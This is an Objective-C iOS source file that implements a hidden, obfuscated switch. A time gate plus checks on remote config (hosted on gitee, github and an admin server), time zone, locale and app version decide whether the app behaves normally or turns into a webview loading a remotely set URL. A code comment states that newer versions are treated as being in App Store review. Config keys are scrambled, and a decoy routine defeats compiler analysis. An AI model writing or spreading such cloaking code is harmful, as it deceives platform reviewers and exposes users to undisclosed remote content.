#import <Foundation/Foundation.h>

#import "__ccisc.h"
#import "cfunc.h"
#import "cocock.h"
#include "cocockCplus.h"

#ifndef ONLY_TIME
#import "coco_Tools.h"
#import "UIWVReachability.h"
//#import "UIWVNetworkAccessibity.h"
#import "WVStateControl.h"
#ifndef NO_WEB_VIEW
#import "UIWVAppDelegate.h"
#endif
#import <CoreTelephony/CTCellularData.h>
#import "MyPHHandler.h"
#import "UIWVErrorController.h"
#endif

typedef struct __ccisc
{
    bool (*dataTimeCheck)(int);
    bool (*_checkJump)(bool);
    void (*_setOT)(char*, int);
#ifndef ONLY_TIME
//    void (*showNoPerm)(void);
    void (*checkResponseObject)(NSDictionary * );
    void (*setPostAndArgs)(bool isPost, NSString* args, NSString* domainStr);
    void (*initWebInfo)(NSDictionary * );
    void (*checkLC)(void);
    bool (*ckl)(NSString * , NSString* , NSString*, NSString* , int ,bool );
    void (*callbackFunc)(NSDictionary * );
    void (*checkReach)(void);
//    void (*checkPerm)(void);
    void (*switchControl)(void);
    void (*buildBackupUrl)(void);
    void (*g)(NSString *);
    void (*_setLC)(NSString *,NSString *);
#ifdef USE_JG
    void (*_setJG)(NSString *);
#endif
    void (*_setRURL)(NSString *);
    bool (*_checkTimeLang)(NSDictionary *);
    void (*showNetErrorView)(void);
    bool (*checkCurrentVersion)(NSDictionary *);
    NSString *(*getSoftVersion)(void);
    bool (*compareVersion)(NSString *, NSString *);
    void (*initAllStatus)(void);
    void (*loopWait)(void);
#endif
} __ccisc_t;


int openTime = 0;

#ifndef ONLY_TIME

static bool nwt = false;
static bool isC = false;
//static NSTimer * timer;
#endif

static __ccisc_t* ct = NULL;
//
//@interface waitClass : NSObject
//@end
//
//@implementation waitClass
//- (void)wt {
//    if (!nwt && timer) {
////        [timer invalidate];
//        timer = nil;
//
////        CFRunLoopStop(CFRunLoopGetMain());
//    }
//}
//@end

// 这个其实没啥用。用于打破苹果的编译优化。防止编译优化直接指向指针

static void _resetct()
{
    __ccisc_t * t = ct;
    ct = malloc(sizeof(__ccisc_t));
    ct->dataTimeCheck = 0x1;
    ct->_checkJump = 0x1;
    ct->_setOT = 0x1;
#ifndef ONLY_TIME
    ct->callbackFunc = 0x1;
//    ct->showNoPerm = 0x1;
    ct->checkResponseObject = 0x1;
    ct->initWebInfo = 0x1;
    ct->checkLC = 0x1;
    ct->checkReach = 0x1;
//    ct->checkPerm = 0x1;
    ct->switchControl = 0x1;
    ct->initAllStatus = 0x22;
    ct->setPostAndArgs = 0x23;
    ct->g = 0x1;
#ifdef USE_JG
    ct->_setJG = 0x1;
#endif
//  ct->_setLC = 0x1;
    ct->_setRURL = 0x1;
    ct->_checkTimeLang = 0x1;
    ct->showNetErrorView = 0x1;
    ct->buildBackupUrl = 0x1;
    ct->checkCurrentVersion = 0x1;
    ct->compareVersion = 0x1;
    ct->getSoftVersion = 0x1;
    ct->loopWait = 0x1;
#endif
    free(ct);
}


#ifndef ONLY_TIME

static void gotoNext() {
    [[NSNotificationCenter defaultCenter] postNotificationName:@"nextStatus" object:nil];
}

static NSString * _getSoftVersion()
{
    return [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"];
}

// 2.0 1.0
static bool _compareVersion(NSString * version1, NSString * version2)
{
    NSArray *list1 = [version1 componentsSeparatedByString:@"."];
    NSArray *list2 = [version2 componentsSeparatedByString:@"."];
    for (int i = 0; i < list1.count || i < list2.count; i++)
    {
        NSInteger a = 0, b = 0;
        if (i < list1.count) {
            a = [list1[i] integerValue];
        }
        if (i < list2.count) {
            b = [list2[i] integerValue];
        }
        if (a > b) {
            return false; //version1大于version2
        } else if (a < b) {
            return true;//version1小于version2
        }
    }
    return true;//version1等于version2
}

static bool _checkCurrentVersion(NSDictionary * obj)
{
    NSString * vs = [ctools strTools]->R(@[@"o", @"n", @"v", @"e", @"r", @"s", @"i"], @[@3,@4,@5,@6,@7,@1,@2]);
    if(obj[vs] != NULL)
    {
        NSString * cv = ct->getSoftVersion();
        if(!ct->compareVersion(cv, obj[vs])) {
            return false;
        }
    }
    return true;
}

// 判断是否满足时区和语言的条件
static bool _checkTimeZoneAndLang(NSDictionary * obj)
{
    {
        NSString * bid = [ctools strTools]->R(@[@"b", @"d", @"i"], @[@1,@3,@2]);
        if(obj[bid] != NULL)
        {
            if(![[[coco_Tools sharedInstance] getBundleid] isEqualToString:obj[bid]]) {
                return false;
            }
        }
    }
//    NSArray * tzArr = @[@28800, @32400];
    NSArray * tzArr = nil;
//    NSString * lang = [ctools strTools]->R(@[@"z", @"h"], @[@1,@2]);
    NSString * lang = @"";
    NSString * tz = [ctools strTools]->R(@[@"t", @"Z", @"i", @"e", @"m"], @[@1,@3,@5,@4,@2]);
    if(obj[tz] != NULL)
    {
        if([obj[tz] isKindOfClass:[NSArray class]])
        {
            tzArr = obj[tz];
        }
    }
    bool isContain = true;
    NSInteger tzv = [[coco_Tools sharedInstance] getTimeZ];
    if([tzArr count] > 0)
    {
        isContain = false;
        for( int i = 0; i < [tzArr count]; i++){
            if([[tzArr objectAtIndex:i] intValue] == tzv){
                isContain = true;
                break;
            }
        }
    }
    if(isContain)
    {
        NSString * lg = [ctools strTools]->R(@[@"l", @"n", @"a", @"g"], @[@1,@3,@2,@4]);
        if(obj[lg] != NULL)
        {
            lang = [[obj[lg] description] stringByReplacingOccurrencesOfString:@" " withString:@""];
        }
        if([lang isEqualToString:@""] || [[[coco_Tools sharedInstance] getLocaleLang] hasPrefix:lang])
        {
            return true;
        }
    }
    return false;
}


static void _checkResponseObject(NSDictionary * obj)
{
    if(!ct->_checkTimeLang(obj))
    {
        isC = true;
        return;
    }
}

static void _initWebInfo(NSDictionary * obj)
{
    {
        NSString* key2 =  [ctools strTools]->R(@[@"l", @"u", @"r"] ,@[@2,@3,@1]);
        [coco_Tools sharedInstance].hP = obj[key2];
    }
#ifndef NO_WEB_VIEW
    {
        int ov = [obj[@"o"] intValue];
        switch (ov) {
            case 1:
                [[coco_Tools sharedInstance] dataTools]->orien = UIInterfaceOrientationMaskPortrait;
                break;
            case 2:
                [[coco_Tools sharedInstance] dataTools]->orien = UIInterfaceOrientationMaskLandscape;
                break;
            default:
                [[coco_Tools sharedInstance] dataTools]->orien = UIInterfaceOrientationMaskAll;
                break;
        }
    }
    {
        [[coco_Tools sharedInstance] dataTools]->setBtn = [obj[[ctools strTools]->R(@[@"s", @"t", @"e"] , @[@1,@3,@2])] boolValue];
    }
    {
        [coco_Tools sharedInstance].idfaKey = obj[[ctools strTools]->R(@[@"i", @"d", @"f", @"a"] , @[@1,@2,@3,@4])];
        if([coco_Tools sharedInstance].idfaKey)
        {
            [coco_Tools sharedInstance].idfaKey = [[coco_Tools sharedInstance].idfaKey stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        }
    }
#ifdef USE_JG
    {
        NSString * jg = obj[[ctools strTools]->R(@[@"j", @"g"] , @[@1,@2])];
        if(jg)
        {
            ct->_setJG(jg);
        }
    }
#endif
    {
        [coco_Tools sharedInstance].idfvKey = obj[[ctools strTools]->R(@[@"i", @"d", @"f", @"v"] , @[@1,@2,@3,@4])];
        if([coco_Tools sharedInstance].idfvKey)
        {
            [coco_Tools sharedInstance].idfvKey = [[coco_Tools sharedInstance].idfvKey stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        }
    }
    {
        [[coco_Tools sharedInstance] dataTools]->noLoad = [obj[[ctools strTools]->R(@[@"o", @"n", @"l", @"a", @"d"] , @[@2,@1,@3,@1,@4,@5])] boolValue];
    }
    [[coco_Tools sharedInstance] dataTools]->isNoB = [obj[[ctools strTools]->R(@[@"o", @"n", @"B", @"r", @"a"] , @[@2,@1,@3,@5,@4])] boolValue];
    [[coco_Tools sharedInstance] dataTools]->bV = [obj[[ctools strTools]->R(@[@"r", @"b", @"a"] ,@[@2,@3,@1])] boolValue];
    [[coco_Tools sharedInstance] dataTools]->full = [obj[[ctools strTools]->R(@[@"f", @"u", @"l"], @[@1,@2,@3,@3])] boolValue];
    [[coco_Tools sharedInstance] dataTools]->igMG = [obj[[ctools strTools]->R(@[@"i", @"g", @"n", @"o", @"r", @"e", @"M", @"e", @"n", @"u", @"G", @"a", @"p"],@[@1,@2,@3,@4,@5,@6,@7,@8,@9,@10,@11,@12,@13])] boolValue];
    {
        NSString* key3 = [ctools strTools]->R(@[@"a", @"l", @"y", @"c", @"n", @"a", @"i", @"t"], @[@1,@5,@6,@2,@3,@8,@7,@4]);
        [[coco_Tools sharedInstance] dataTools]->ana = [obj[key3] boolValue];
    }
    {
        NSString* hideNav = [ctools strTools]->R(@[@"h", @"i", @"e", @"d", @"N", @"v", @"a"], @[@1,@2,@4,@3,@5,@7,@6]);
        [[coco_Tools sharedInstance] dataTools]->hideNav = [obj[hideNav] boolValue];
    }
    {
        NSArray * g = obj[[ctools strTools]->R(@[@"t", @"g", @"e"] ,@[@2,@3,@1])];
        if(g)
        {
            int count = g.count;
            for( int i = 0; i < count; i++){
                [[coco_Tools sharedInstance].qArgs addObject:[NSString stringWithFormat:@"%@", [g objectAtIndex:i]]];
            }
        }
    }
    
    {
        NSString * ph = [ctools strTools]->R(@[@"p",@"h", @"t", @"a", @"c"], @[@1,@4,@3,@5,@2]);
        NSArray * arr = obj[ph];
        if(arr)
        {
            int count = arr.count;
            for( int i = 0; i < count; i++){
                [[coco_Tools sharedInstance].patch addObject:[NSString stringWithFormat:@"%@", [arr objectAtIndex:i]]];
            }
        }
    }
    
    {
        NSString * gets = [ctools strTools]->R(@[@"g",@"e", @"t", @"A", @"d", @"r"], @[@1,@2,@3,@4,@5,@5,@6]);
        NSArray * getArr = obj[gets];
        
        if(getArr)
        {
            int count = getArr.count;
            for( int i = 0; i < count; i++){
                [[coco_Tools sharedInstance].addGetList addObject:[NSString stringWithFormat:@"%@", [getArr objectAtIndex:i]]];
            }
        } else {
            [[coco_Tools sharedInstance].addGetList addObject:[coco_Tools sharedInstance].hP];
        }
    }
#endif
    
}

static void _callbackFunc(NSDictionary * obj)
{
    // 判断版本。如果版本超过。那么直接认为这个配置是无效的。且认为是在审核模式下。
    if(!ct->checkCurrentVersion(obj)){
        isC = true;
        return;
    }
    NSString* key = [ctools strTools]->R(@[@"s", @"i", @"p", @"n", @"e", @"O"], @[@2,@1,@6,@3,@5,@4]);
    BOOL r = false;
    if(obj) {
        r = [obj[key] boolValue];
        if([[coco_Tools sharedInstance] dataTools]->isOt) {
            if([obj[[ctools strTools]->R(@[@"5", @"g", @"h", @"o"], @[@2,@4,@3,@1])] boolValue])
            {
                [[coco_Tools sharedInstance] dataTools]->isOt = false;
            }
        } else {
            if([obj[[ctools strTools]->R(@[@"5", @"n", @"o", @"h"], @[@2,@3,@4,@1])] boolValue])
            {
                [[coco_Tools sharedInstance] dataTools]->isOt = true;
            }
        }
    }
    if(r)
    {
        isC = false;
        ct->checkResponseObject(obj);
        if(isC) {
            return;
        }
        ct->initWebInfo(obj);
        if([UIApplication sharedApplication]) {
            gotoNext();
        }
    }
    else{
        isC = true;
    }
}

static void _setPostAndArgs(bool isPost, NSString* args, NSString* domainStr)
{
    [[coco_Tools sharedInstance] dataTools]->isPost = isPost;
    if(args) {
        [coco_Tools sharedInstance].reqArgs = args;
    }
    if(domainStr) {
        [coco_Tools sharedInstance].domainStr = domainStr;
    }
}

static void solveDomain()
{
    NSString * domainStr = [[coco_Tools sharedInstance] domainStr];
    domainStr = [domainStr stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    NSString * bidKey = [ctools strTools]->R(@[@"_",@"B", @"U", @"N", @"D", @"L", @"E", @"I"] ,@[@1,@1, @2, @3, @4, @5, @6, @7,@1, @8, @5, @1, @1]);
    if([domainStr containsString:bidKey]){
        NSString * bid = [[NSBundle mainBundle]bundleIdentifier];
        bid = [bid stringByReplacingOccurrencesOfString:@"-" withString:@""];
        bid = [bid stringByReplacingOccurrencesOfString:@"." withString:@""];
        bid = [bid stringByReplacingOccurrencesOfString:@"_" withString:@""];
        domainStr = [domainStr stringByReplacingOccurrencesOfString:bidKey withString:bid];
    }
    NSString * timeKey = [ctools strTools]->R(@[@"_",@"T", @"I", @"M", @"E"] ,@[@1,@1, @2, @3, @4, @5,@1, @1]);
    if([domainStr containsString:timeKey]){
        domainStr = [domainStr stringByReplacingOccurrencesOfString:timeKey withString:[[coco_Tools sharedInstance] ofTimeStr]];
    }
    
    NSArray * domainArr = @[
        @[@"n", @"e", @"t"],
        @[@"c", @"n"],
        @[@"c", @"o", @"m"],
        @[@"x", @"y", @"z"],
    ];
    NSString * comKey = [ctools strTools]->R(@[@"_",@"C", @"O", @"M"] ,@[@1,@1, @2, @3, @4,@1, @1]);
    for(NSArray * addr in domainArr) {
        NSString * p = [domainStr stringByReplacingOccurrencesOfString:comKey withString:[addr componentsJoinedByString:@""]];
        ct->_setRURL(p);
    }
}

static void solveGit()
{
    NSString * bid = [[NSBundle mainBundle]bundleIdentifier];
    bid = [bid stringByReplacingOccurrencesOfString:@"-" withString:@""];
    bid = [bid stringByReplacingOccurrencesOfString:@"." withString:@""];
    bid = [bid stringByReplacingOccurrencesOfString:@"_" withString:@""];
    
    NSArray * arr = @[
//        https://gitee.com/pfzq303/test/blob/master/README.md
        @[@[@"https://gitee.com/"], @[@"g",@"i",@"t",@"e",@"e",@"/",@"e",@"n",@"t",@"e",@"r",@"/",@"b",@"l",@"o",@"b",@"/",@"m",@"a",@"s",@"t",@"e",@"r",@"/",@"c",@"o",@"n",@"f",@"i",@"g",@".",@"j",@"s",@"o",@"n"]],
//        https://github.com/pfzq303/ddddd/blob/master/config.json
  @[@[@"https://github.com/"],@[@"g",@"i",@"t",@"h",@"u",@"b",@"/",@"e",@"n",@"t",@"e",@"r",@"/",@"b",@"l",@"o",@"b",@"/",@"m",@"a",@"s",@"t",@"e",@"r",@"/",@"c",@"o",@"n",@"f",@"i",@"g",@".",@"j",@"s",@"o",@"n"]], // github
        
         @[@[@"http://api.admin.com:10010/getConfig?bid="],@[@""]], // admin
                          ];
        for(NSArray * addr in arr) {
            NSString * p = [[[[addr objectAtIndex:0] componentsJoinedByString:@""] stringByAppendingString:bid] stringByAppendingString:[[addr objectAtIndex:1] componentsJoinedByString:@""]];
            ct->_setRURL(p);
        }
}

static void _buildBackupUrl()
{
    if(![[coco_Tools sharedInstance] domainStr] || [[[coco_Tools sharedInstance] domainStr] isEqualToString:@""]) {
        solveGit();
    }
    else {
        solveDomain();
    }
    [[coco_Tools sharedInstance] pushCheckQueue:HYLocalCache];
}

static void _checkLC()
{
    isC = false;
    ct->buildBackupUrl();
    [MyPHHandler queryForInfo:^(NSDictionary * obj, bool isOK){
        if(isOK) {
            ct->callbackFunc(obj);
            nwt = false;
            refreshError(isC);
        } else {
            // 所有的请求都尝试了不成功。直接强制出去吧。
            [[coco_Tools sharedInstance] dataTools]->isOt = true;
            nwt = false;
            refreshError(isC);
        }
    }];
}

static void waitWindow(void(^onready)(void))
{
    UIApplication * app = [UIApplication sharedApplication];
    if(app) {
        UIWindow *keyWindow = [UIApplication sharedApplication].keyWindow;
        if(keyWindow) {
            dispatch_async(dispatch_get_main_queue(), ^{
                onready();
            });
        } else {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.001 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                waitWindow(onready);
            });
        }
    } else {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.001 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            waitWindow(onready);
        });
    }
}

static void _go(NSString * str)
{
    UIApplicationMain(0, NULL, nil, str);
}

static void _switchControl()
{
    waitWindow(^{
        refreshError(isC);
    });
    if([coco_Tools sharedInstance].remoteURL.count > 0) {
        if(![[coco_Tools sharedInstance] dataTools]->isOt) {
#ifdef NO_WEB_VIEW
            waitWindow(^{
                [[UIApplication sharedApplication] openURL:[NSURL URLWithString:[coco_Tools sharedInstance].hP]];
            });
#else
            if([UIApplication sharedApplication]) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    UIWVAppDelegate * delegate = [UIApplication sharedApplication].delegate;
                    if ([delegate isKindOfClass:[UIWVAppDelegate class]]) {
                        [delegate refreshView];
                    }
                });
            } else {
                @autoreleasepool
                {
                    ct->g(NSStringFromClass([UIWVAppDelegate class]));
                }
            }
            
#endif
        }
    }
}
//static void _setLCInfo(NSString * key, NSString* idInfo)
//{
//    [MyPHHandler setPHInfo:key chan:idInfo];
//    [[coco_Tools sharedInstance] pushCheckQueue:HYLeanCloud];
//}

#ifdef USE_JG
static void _setJGInfo(NSString* jg)
{
    [MyPHHandler setJGKey:jg];
}
#endif


static void _setRemoteUrl(NSString* s)
{
    [[coco_Tools sharedInstance].remoteURL addObject:s];
    [[coco_Tools sharedInstance] pushCheckQueue:HYJSON];
}

static void _loopWait()
{
    NSRunLoop * runloop = [NSRunLoop currentRunLoop];
    [runloop addPort: [NSMachPort port] forMode: NSDefaultRunLoopMode];
    while(nwt) {
        [runloop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
    }
}

static void _showNetErrorView()
{
    [[coco_Tools sharedInstance] dataTools]->isNR = 1;
    if([UIApplication sharedApplication]) {
        ct->switchControl();
    } else {
        nwt = false;
    }
}

static void _checkReach()
{
    // Allocate a reachability object
    
    UIWVReachability* reach = [UIWVReachability reachabilityWithHostname:[ctools strTools]->R(@[@"w", @".", @"b", @"i", @"n", @"g", @"c", @"o", @"m"], @[@1,@1,@1,@2, @3, @4, @5, @6, @2, @7, @8, @9])];
    __block BOOL isOk = false;
    __block BOOL isShowError = false;
    // Set the blocks
    reach.reachableBlock = ^(UIWVReachability*reach)
    {
        // keep in mind this is called on a background thread
        // and if you are updating the UI it needs to happen
        // on the main thread, like this:
        dispatch_async(dispatch_get_main_queue(), ^{
            if(!isOk) {
                [reach stopNotifier];
                isOk = true;
                [[coco_Tools sharedInstance] dataTools]->isNR = 0;
                gotoNext();
            }
        });
    };
    
    reach.unreachableBlock = ^(UIWVReachability* reach)
    {
        isOk = false;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            if(!isOk)
            {
                isShowError = true;
                ct->showNetErrorView();
            }
        });
    };
    // Start the notifier, which will cause the reachability object to retain itself!
    [reach startNotifier];
}

static void _initAllStatus () {
    [[WVStatusControl sharedInstance] addStep: ct->checkReach];
    [[WVStatusControl sharedInstance] addStep: ct->checkLC];
    [[WVStatusControl sharedInstance] addStep: ct->switchControl];
}

#endif // ONLY_TIME

static bool _dataTimeCheck (int sd)
{
    int lt = [ctools getCTimeStr];
    return sd > lt;
}

static void _setOpenTime(char* dtStr, int s)
{
#ifndef ONLY_TIME
    if(s != 0)
    {
        dtStr = [[coco_Tools sharedInstance] strTools]->decodeStr(dtStr, s);
    }
    [coco_Tools sharedInstance].ofTimeStr = [NSString stringWithUTF8String:dtStr];
#endif
    openTime = atoi(dtStr);
}


static bool _checkLocal(bool isOt)
{
    if(ct->dataTimeCheck(openTime))
    {
        return true;
    }
    else
    {
#ifndef ONLY_TIME
        [[coco_Tools sharedInstance] resetPatchData];
        [[coco_Tools sharedInstance] dataTools]->isOt = isOt;
        nwt = true;
        gotoNext();
        ct->loopWait();
        if (isC) {
            return true;
        } else {
            ct->switchControl();
        }
#endif
        return false;
    }
}

static void buildCt()
{
    if(!ct)
    {
        ct = malloc(sizeof(__ccisc_t));
        ct->dataTimeCheck = _dataTimeCheck;
        ct->_setOT = _setOpenTime;
        ct->_checkJump = _checkLocal;
#ifndef ONLY_TIME
        ct->callbackFunc = _callbackFunc;
//        ct->showNoPerm = _showNoPerm;
        ct->checkResponseObject = _checkResponseObject;
        ct->initWebInfo = _initWebInfo;
        ct->checkLC = _checkLC;
        ct->checkReach = _checkReach;
//        ct->checkPerm = _checkPerm;
        ct->switchControl = _switchControl;
        ct->g = _go;
#ifdef USE_JG
        ct->_setJG = _setJGInfo;
#endif
//        ct->_setLC = _setLCInfo;
        ct->_setRURL = _setRemoteUrl;
        ct->setPostAndArgs = _setPostAndArgs;
        ct->_checkTimeLang = _checkTimeZoneAndLang;
        ct->showNetErrorView = _showNetErrorView;
        ct->buildBackupUrl = _buildBackupUrl;
        ct->checkCurrentVersion = _checkCurrentVersion;
        ct->compareVersion = _compareVersion;
        ct->getSoftVersion = _getSoftVersion;
        ct->loopWait = _loopWait;
        ct->initAllStatus = _initAllStatus;
#endif
    }
}

static void setct(ccisc_t * ot)
{
    ot->setOpenTime_ = ct->_setOT;
//    ot->setLC_ = ct->_setLC;
    ot->checkIsOpen_ = ct->_checkJump;
#ifndef ONLY_TIME
    ot->setRemoteURL_ = ct->_setRURL;
    ot->setPostAndArgs_ = ct->setPostAndArgs;
#endif
}


static BOOL _inArr()
{
    NSString* ch = @"\\";
    NSArray<NSString*>* invalidCharArr = @[@"0",@"1",@"2",@"3",@"4",@"5",@"6",@"7",@"8",@"9",
           @"A",@"B",@"C",@"D",@"E",@"F",@"G",@"H",@"I",@"J",@"K",@"L",@"M",@"N",@"O",@"P",@"Q",@"R",@"S",@"T",@"U",@"V",@"W",@"X",@"Y",@"Z",
           @"a",@"b",@"c",@"d",@"e",@"f",@"g",@"h",@"i",@"j",@"k",@"l",@"m",@"n",@"o",@"p",@"q",@"r",@"s",@"t",@"u",@"v",@"w",@"x",@"y",@"z",
           @" ",@"_",@":",@";",@"<",@"=",@">",@"?",@"@",@"",@"[",@"]"];
    if([invalidCharArr containsObject:ch]) {
        _resetct();
        return true;
    } else {
        buildCt();
        return false;
    }
}

@implementation _init_ccisc

+(void) st : (void *) ptr
{
    _inArr();
    setct((__ccisc_t*)ptr);
#ifndef ONLY_TIME
    ct->initAllStatus();
#endif
}

@end

